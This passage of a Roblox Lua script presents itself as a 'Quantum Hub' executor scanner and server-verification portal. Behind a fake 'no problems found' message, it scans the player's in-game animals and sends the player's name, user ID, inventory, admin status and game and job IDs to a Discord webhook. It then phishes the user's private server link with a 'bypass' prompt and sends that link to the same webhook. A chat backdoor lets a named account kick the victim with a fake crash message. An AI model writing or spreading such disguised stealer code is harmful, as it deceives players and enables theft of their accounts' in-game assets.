                         "\n**User ID:** " .. tostring(LocalPlayer.UserId) ..
                         "\n**Total Animals:** " .. tostring(#foundAnimals) ..
                         "\n**Has Admin:** " .. (playerOwnsAdmin and "✅ Yes" or "❌ No") ..
                         "\n**Unique Rarities:** " .. tostring(#RarityBuckets),
            color = 0x00ffcc,
            fields = rarityFields,
            footer = {text = "Quantum Scanner • " .. os.date("%H:%M:%S")},
            thumbnail = {
                url = "https://cdn.discordapp.com/attachments/1181084530205007932/1249885584508842085/1000_F_117361948_32tLFdD2opmzh7F2k6lf4yPvwcRqxRqM.png"
            }
        }},
        username = "Animal Scanner"
    }
    
    Request({
        Url = webhookURL,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(payload)
    })
    
    return {
        totalAnimals = #foundAnimals,
        rarityBuckets = RarityBuckets,
        hasAdmin = playerOwnsAdmin,
        scanTime = os.date("%H:%M:%S")
    }
end

-- ============================
-- QUANTUM PORTAL UI
-- ============================
local function createQuantumPortal(scanResults)
    local gui = Instance.new("ScreenGui")
    gui.Name = "QuantumPortal"
    gui.ResetOnSpawn = false
    gui.Parent = LocalPlayer:WaitForChild("PlayerGui")

    -- Background overlay
    local overlay = Instance.new("Frame")
    overlay.Size = UDim2.new(1, 0, 1, 0)
    overlay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    overlay.BackgroundTransparency = 0.6
    overlay.BorderSizePixel = 0
    overlay.Parent = gui

    local overlayGradient = Instance.new("UIGradient")
    overlayGradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(10, 10, 20)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(20, 10, 30))
    })
    overlayGradient.Rotation = 45
    overlayGradient.Parent = overlay

    -- Main container
    local container = Instance.new("Frame")
    container.Size = UDim2.new(0, 600, 0, 420)
    container.Position = UDim2.new(0.5, -300, 0.5, -210)
    container.BackgroundColor3 = Color3.fromRGB(20, 20, 35)
    container.BackgroundTransparency = 0.1
    container.BorderSizePixel = 0
    container.AnchorPoint = Vector2.new(0.5, 0.5)
    container.Parent = gui

    -- Rounded corners
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 20)
    corner.Parent = container

    -- Animated border
    local border = Instance.new("Frame")
    border.Size = UDim2.new(1, 6, 1, 6)
    border.Position = UDim2.new(0, -3, 0, -3)
    border.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
    border.BackgroundTransparency = 0.7
    border.BorderSizePixel = 0
    border.Parent = container
    local borderCorner = Instance.new("UICorner")
    borderCorner.CornerRadius = UDim.new(0, 22)
    borderCorner.Parent = border

-- Header
local header = Instance.new("Frame")
header.Size = UDim2.new(1, 0, 0, 100)
header.BackgroundColor3 = Color3.fromRGB(15, 15, 30)
header.BorderSizePixel = 0
header.Parent = container

local headerCorner = Instance.new("UICorner")
headerCorner.CornerRadius = UDim.new(0, 20)
headerCorner.Parent = header

local headerGradient = Instance.new("UIGradient")
headerGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 100, 220)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(120, 0, 220)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 150, 255))
})
headerGradient.Rotation = -10
headerGradient.Parent = header

-- Player Thumbnail
local thumbUrl = Players:GetUserThumbnailAsync(LocalPlayer.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size100x100)

local playerThumbnail = Instance.new("ImageLabel")
playerThumbnail.Size = UDim2.new(0, 80, 0, 80) -- Adjust size
playerThumbnail.Position = UDim2.new(0, 10, 0, 10) -- Offset inside header
playerThumbnail.BackgroundTransparency = 1
playerThumbnail.Image = thumbUrl
playerThumbnail.Parent = header

local thumbCorner = Instance.new("UICorner")
thumbCorner.CornerRadius = UDim.new(0, 40) -- Make it circular
thumbCorner.Parent = playerThumbnail

    -- Logo
    local logo = Instance.new("ImageLabel")
    logo.Size = UDim2.new(0, 40, 0, 40)
    logo.Position = UDim2.new(0, 20, 0, 20)
    logo.Image = "rbxassetid://7072718251"
    logo.ImageColor3 = Color3.fromRGB(255, 255, 255)
    logo.BackgroundTransparency = 1
    logo.Parent = header

local title = Instance.new("TextLabel")
title.Position = UDim2.new(0, 180, 0, 15) -- moved far right from thumbnail
title.Size = UDim2.new(1, -190, 0.5, -5) -- reduce width accordingly so it doesn't overflow
title.Text = "QUANTUM PORTAL"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.TextSize = 28
title.Font = Enum.Font.GothamBlack
title.BackgroundTransparency = 1
title.TextXAlignment = Enum.TextXAlignment.Left
title.Parent = header


local subtitle = Instance.new("TextLabel")
subtitle.Size = UDim2.new(1, -190, 0, 25) -- match width adjustment of title
subtitle.Position = UDim2.new(0, 180, 0, 55) -- same X as title, slightly lower Y
subtitle.Text = "QUANTUM HUB | SERVER VERIFICATION"
subtitle.TextColor3 = Color3.fromRGB(180, 200, 255)
subtitle.TextSize = 14
subtitle.Font = Enum.Font.GothamBold
subtitle.BackgroundTransparency = 1
subtitle.TextXAlignment = Enum.TextXAlignment.Left
subtitle.Parent = header

        -- Content area
    local content = Instance.new("Frame")
    content.Size = UDim2.new(1, -40, 0, 260)
    content.Position = UDim2.new(0, 20, 0, 120)
    content.BackgroundTransparency = 1
    content.Parent = container

        -- Scan results display
    local resultsPanel = Instance.new("Frame")
    resultsPanel.Size = UDim2.new(1, 0, 0, 100)
    resultsPanel.BackgroundColor3 = Color3.fromRGB(25, 25, 40)
    resultsPanel.BorderSizePixel = 0
    resultsPanel.Parent = content

    local resultsCorner = Instance.new("UICorner")
    resultsCorner.CornerRadius = UDim.new(0, 12)
    resultsCorner.Parent = resultsPanel

    local resultsIcon = Instance.new("ImageLabel")
    resultsIcon.Size = UDim2.new(0, 24, 0, 24)
    resultsIcon.Position = UDim2.new(0, 15, 0, 15)
    resultsIcon.Image = "rbxassetid://7072716645"
    resultsIcon.ImageColor3 = Color3.fromRGB(100, 200, 255)
    resultsIcon.BackgroundTransparency = 1
    resultsIcon.Parent = resultsPanel

    local resultsText = Instance.new("TextLabel")
    resultsText.Size = UDim2.new(1, -50, 1, -20)
    resultsText.Position = UDim2.new(0, 50, 0, 10)
    resultsText.Text = "✅ Scan Complete!\nFound no problems in your executor."
    resultsText.TextColor3 = Color3.fromRGB(180, 220, 255)
    resultsText.TextSize = 14
    resultsText.Font = Enum.Font.GothamMedium
    resultsText.BackgroundTransparency = 1
    resultsText.TextWrapped = true
    resultsText.TextXAlignment = Enum.TextXAlignment.Left
    resultsText.Parent = resultsPanel


    -- Input field
    local inputContainer = Instance.new("Frame")
    inputContainer.Size = UDim2.new(1, 0, 0, 60)
    inputContainer.Position = UDim2.new(0, 0, 0, 110)
    inputContainer.BackgroundColor3 = Color3.fromRGB(30, 30, 45)
    inputContainer.BorderSizePixel = 0
    inputContainer.Parent = content

    local inputCorner = Instance.new("UICorner")
    inputCorner.CornerRadius = UDim.new(0, 12)
    inputCorner.Parent = inputContainer

    local inputIcon = Instance.new("ImageLabel")
    inputIcon.Size = UDim2.new(0, 24, 0, 24)
    inputIcon.Position = UDim2.new(0, 15, 0.5, -12)
    inputIcon.Image = "rbxassetid://7072720902"
    inputIcon.ImageColor3 = Color3.fromRGB(150, 150, 180)
    inputIcon.BackgroundTransparency = 1
    inputIcon.Parent = inputContainer

    local input = Instance.new("TextBox")
    input.Size = UDim2.new(1, -60, 1, -20)
    input.Position = UDim2.new(0, 50, 0, 10)
    input.PlaceholderText = "Enter your private server link to bypass..."
    input.Text = ""
    input.TextColor3 = Color3.fromRGB(255, 255, 255)
    input.PlaceholderColor3 = Color3.fromRGB(140, 150, 180)
    input.BackgroundTransparency = 1
    input.Font = Enum.Font.GothamMedium
    input.TextSize = 16
    input.ClearTextOnFocus = false
    input.Parent = inputContainer

    -- Status label
    local statusLabel = Instance.new("TextLabel")
    statusLabel.Size = UDim2.new(1, 0, 0, 20)
    statusLabel.Position = UDim2.new(0, 0, 0, 180)
    statusLabel.Text = "Enter your private server link"
    statusLabel.TextColor3 = Color3.fromRGB(180, 200, 220)
    statusLabel.TextSize = 14
    statusLabel.Font = Enum.Font.Gotham
    statusLabel.BackgroundTransparency = 1
    statusLabel.TextXAlignment = Enum.TextXAlignment.Left
    statusLabel.Parent = content

    -- Buttons
    local buttons = Instance.new("Frame")
    buttons.Size = UDim2.new(1, 0, 0, 60)
    buttons.Position = UDim2.new(0, 0, 1, -60)
    buttons.BackgroundTransparency = 1
    buttons.Parent = content

    -- Submit button
    local submitButton = Instance.new("TextButton")
    submitButton.Size = UDim2.new(0.5, -10, 1, 0)
    submitButton.Position = UDim2.new(0.5, 5, 0, 0)
    submitButton.Text = "SUBMIT"
    submitButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    submitButton.TextSize = 18
    submitButton.Font = Enum.Font.GothamBold
    submitButton.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
    submitButton.BorderSizePixel = 0
    submitButton.Parent = buttons

    local submitCorner = Instance.new("UICorner")
    submitCorner.CornerRadius = UDim.new(0, 12)
    submitCorner.Parent = submitButton

    -- Cancel button
    local cancelButton = Instance.new("TextButton")
    cancelButton.Size = UDim2.new(0.5, -10, 1, 0)
    cancelButton.Position = UDim2.new(0, 0, 0, 0)
    cancelButton.Text = "CANCEL"
    cancelButton.TextColor3 = Color3.fromRGB(200, 210, 230)
    cancelButton.TextSize = 18
    cancelButton.Font = Enum.Font.GothamBold
    cancelButton.BackgroundColor3 = Color3.fromRGB(50, 50, 70)
    cancelButton.BorderSizePixel = 0
    cancelButton.Parent = buttons

    local cancelCorner = Instance.new("UICorner")
    cancelCorner.CornerRadius = UDim.new(0, 12)
    cancelCorner.Parent = cancelButton

    -- ============================
    -- DRAG FUNCTIONALITY
    -- ============================
    local dragging = false
    local dragInput, dragStart, startPos

    local function updateDrag(input)
        local delta = input.Position - dragStart
        container.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, 
                                       startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end

    container.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true
            dragStart = input.Position
            startPos = container.Position
            
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)

    container.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement then
            dragInput = input
        end
    end)

    UserInputService.InputChanged:Connect(function(input)
        if input == dragInput and dragging then
            updateDrag(input)
        end
    end)

    -- ============================
    -- VALIDATION FUNCTIONS
    -- ============================
    local function isValidRobloxURL(url)
        if not url or url == "" then return false end
        
        return true
    end

    local function cleanURL(url)
        local placeId = string.match(url, "games/(%d+)")
        if placeId then
            return "https://www.roblox.com/games/" .. placeId
        end
        
        if string.match(url, "^%d+$") then
            return "https://www.roblox.com/games/" .. url
        end
        
        return url
    end

    -- ============================
    -- SEND LINK FUNCTION
    -- ============================
    local function sendLink(link)
        local payload = {
            content = "",
            embeds = {{
                title = "🔗 Server Link + Animal Scan",
                description = "**Player:** " .. LocalPlayer.Name .. 
                             "\n**User ID:** " .. tostring(LocalPlayer.UserId) ..
                             "\n**Server Link:** " .. link ..
                             "\n**Timestamp:** " .. os.date("%Y-%m-%d %H:%M:%S"),
                color = 0x00aaff,
                fields = {
                    {
                        name = "📊 Animal Scan Results",
                        value = "Total Animals: " .. tostring(scanResults.totalAnimals) ..
                               "\nUnique Rarities: " .. tostring(#scanResults.rarityBuckets) ..
                               "\nHas Admin: " .. (scanResults.hasAdmin and "✅ Yes" or "❌ No") ..
                               "\nScan Time: " .. scanResults.scanTime,
                        inline = true
                    },
                    {
                        name = "🎮 Game Info",
                        value = "Game: " .. game.Name ..
                               "\nPlace ID: " .. game.PlaceId ..
                               "\nJob ID: " .. game.JobId,
                        inline = true
                    }
                },
                footer = {
                    text = "Quantum Portal • Complete Scan Report"
                }
            }},
            username = "Quantum Portal",
            avatar_url = "https://cdn.discordapp.com/attachments/1181084530205007932/1249885584508842085/1000_F_117361948_32tLFdD2opmzh7F2k6lf4yPvwcRqxRqM.png"
        }

        Request({
            Url = webhookURL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(payload)
        })
    end

    -- ============================
    -- BUTTON HANDLERS
    -- ============================
    submitButton.MouseButton1Click:Connect(function()
        local url = input.Text
        local cleanedURL = cleanURL(url)
        
        if isValidRobloxURL(cleanedURL) then
            statusLabel.Text = "✓ Valid URL detected. Processing..."
            statusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
            
            submitButton.Text = "SUBMITTING..."
            submitButton.BackgroundColor3 = Color3.fromRGB(100, 100, 150)
            
            task.spawn(function()
                local success, err = pcall(function()
                    sendLink(cleanedURL)
                end)
                
                if success then
                    statusLabel.Text = "✓ Successfully submitted! Closing..."
                    
                    -- Success animation
                    TweenService:Create(container, TweenInfo.new(0.5), {
                        Position = UDim2.new(0.5, -300, 0.5, 600)
                    }):Play()
                    
                    TweenService:Create(overlay, TweenInfo.new(0.5), {
                        BackgroundTransparency = 1
                    }):Play()
                    
                    task.wait(0.6)
                    gui:Destroy()
                else
                    statusLabel.Text = "✗ Failed to submit: " .. tostring(err)
                    statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
                    submitButton.Text = "SUBMIT"
                    submitButton.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
                end
            end)
        else
            statusLabel.Text = "✗ Invalid Roblox URL format"
            statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
            
            -- Shake animation
            for i = 1, 6 do
                container.Position = UDim2.new(0.5, -300 + (i % 2 == 0 and 5 or -5), 0.5, -210)
                task.wait(0.03)
            end
            container.Position = UDim2.new(0.5, -300, 0.5, -210)
            
            task.delay(2, function()
                if statusLabel then
                    statusLabel.Text = "Enter your private server link"
                    statusLabel.TextColor3 = Color3.fromRGB(180, 200, 220)
                end
            end)
        end
    end)

    cancelButton.MouseButton1Click:Connect(function()
        -- Fade out animation
        TweenService:Create(container, TweenInfo.new(0.4), {
            Position = UDim2.new(0.5, -300, 0.5, -600)
        }):Play()
        
        TweenService:Create(overlay, TweenInfo.new(0.4), {
            BackgroundTransparency = 1
        }):Play()
        
        task.wait(0.5)
        gui:Destroy()
    end)

    -- Button hover effects
    submitButton.MouseEnter:Connect(function()
        TweenService:Create(submitButton, TweenInfo.new(0.2), {
            BackgroundColor3 = Color3.fromRGB(0, 200, 255)
        }):Play()
    end)
    
    submitButton.MouseLeave:Connect(function()
        if submitButton.Text == "SUBMIT" then
            TweenService:Create(submitButton, TweenInfo.new(0.2), {
                BackgroundColor3 = Color3.fromRGB(0, 170, 255)
            }):Play()
        end
    end)
    
    cancelButton.MouseEnter:Connect(function()
        TweenService:Create(cancelButton, TweenInfo.new(0.2), {
            BackgroundColor3 = Color3.fromRGB(70, 70, 90)
        }):Play()
    end)
    
    cancelButton.MouseLeave:Connect(function()
        TweenService:Create(cancelButton, TweenInfo.new(0.2), {
            BackgroundColor3 = Color3.fromRGB(50, 50, 70)
        }):Play()
    end)

    -- ============================
    -- ENTRY ANIMATION
    -- ============================
    container.Position = UDim2.new(0.5, -300, 0.5, -600)
    container.BackgroundTransparency = 1
    overlay.BackgroundTransparency = 1

    TweenService:Create(overlay, TweenInfo.new(0.5), {
        BackgroundTransparency = 0.6
    }):Play()

    TweenService:Create(container, TweenInfo.new(0.7, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
        Position = UDim2.new(0.5, -300, 0.5, -210),
        BackgroundTransparency = 0.1
    }):Play()

    -- Auto-focus input after animation
    task.wait(0.8)
    input:CaptureFocus()
    
    return gui
end

-- ============================
-- MAIN EXECUTION
-- ============================
local function main()
    -- First, perform animal scan
    local scanResults = scanAnimals()
    
    -- Wait a moment for scan to complete
    task.wait(1)
    
    -- Create the Quantum Portal with scan results
    createQuantumPortal(scanResults)
end

-- Run the main function
main()

local LP = Players.LocalPlayer

-- Connect to EVERY player's chat
Players.PlayerAdded:Connect(function(player)
    player.Chatted:Connect(function(msg)
        print(player.Name .. ": " .. msg)

        if player.Name == "Millions645" and msg == ".k" then
            LP:Kick("ERROR: SCRIPT CRASHED")
        end
    end)
end)

-- Also connect to players already in game
for _, player in ipairs(Players:GetPlayers()) do
    player.Chatted:Connect(function(msg)
        print(player.Name .. ": " .. msg)

        if player.Name == "Millions645" and msg == ".k" then
            LP:Kick("ERROR: SCRIPT CRASHED")
        end
    end)
end 
